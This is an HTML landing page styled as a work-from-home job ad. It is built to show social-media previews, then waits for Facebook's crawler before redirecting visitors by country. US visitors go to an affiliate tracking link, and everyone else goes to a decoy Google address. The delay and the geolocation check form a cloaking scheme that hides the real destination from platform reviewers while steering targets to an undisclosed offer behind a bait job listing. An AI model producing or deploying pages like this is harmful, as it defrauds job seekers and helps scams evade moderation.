<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Work From Home Job Part Time & Full Time</title>

  <!-- Facebook / WhatsApp Preview -->
  <meta property="og:title" content="Work From Home Job Part Time & Full Time">
  <meta property="og:description" content="Apply Now for Daily Income Opportunities. Work From Home!">
  <meta property="og:image" content="https://i.ibb.co.com/vCMfbKTL/images-1.png">
  <meta property="og:url" content="https://www.vinos4.com">
  <meta property="og:type" content="website">

  <style>
    body {
      margin: 0;
      background: #000;
      text-align: center;
      color: #fff;
      font-family: Arial, sans-serif;
    }
    img {
      width: 100%;
      max-width: 600px;
    }
    h1 {
      font-size: 24px;
      margin-top: 20px;
    }
  </style>

  <script>
    async function redirectByCountry() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        const country = data.country; // Country code

        if (country === 'US') {
          // USA visitor → NEW Offer link
          window.location.href = "https://www.af9m8trk.com/HEQ121Y7/7SW12E22/?s1=Mb69";
        } else {
          // Non-USA visitor → Another site
          window.location.href = "https://site.google.com";
        }
      } catch (err) {
        // On error, default redirect
        window.location.href = "https://site.google.com";
      }
    }

    // Delay for FB crawler to read meta tags
    setTimeout(redirectByCountry, 1500);
  </script>
</head>
<body>
  <h1>Work From Home Job Part Time & Full Time</h1>
  <img src="https://i.ibb.co.com/vCMfbKTL/images-1.png" alt="Job Image">
</body>
</html>
